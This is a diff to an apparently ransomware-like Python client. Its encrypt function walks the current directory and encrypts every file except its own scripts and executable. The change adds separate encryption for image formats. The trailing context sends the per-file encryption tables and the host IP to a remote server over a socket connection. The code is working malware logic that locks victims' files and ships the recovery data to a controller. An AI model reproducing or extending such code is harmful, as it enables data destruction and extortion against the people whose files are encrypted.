@@ -18,12 +18,28 @@ def encrypt(server) :
     dir_path = "./"
     file_list = os.listdir(dir_path)
     table_list = []
+    img_list = [
+        "BMP", "RLE", "DIB", "JPEG", "JPG", "GIF", "PNG", "TIF", "TIFF", "JFIF",
+        "bmp", "rle", "dib", "jpeg", "jpg", "gif", "png", "tif", "tiff", "jfif"
+    ]
 
     for i in range(len(file_list)) :
-        if "." in file_list[i] and not file_list[i] in ["decrypt.py", "client.py", "crypto.py"] :
-            result, table = ct.encrypt_file(dir_path + "/" + file_list[i])
+        if "." in file_list[i] and not file_list[i] in ["client.exe", "decrypt.py", "client.py", "crypto.py"] :
+            file_info = file_list[i].split(".")
+            
+            if file_info[1] in img_list :
+                result, table = ct.encrypt_image_file(dir_path + "/" + file_list[i])
 
-            table_list.append([file_list[i], table])
+                table_list.append([file_list[i], table])
+
+            else :
+                result, table = ct.encrypt_file(dir_path + "/" + file_list[i])
+
+                table_list.append([file_list[i], table])
+
+        print(i)
+
+    print("good")
 
     server.emit("data", json.dumps([{
         "ip" : ip,
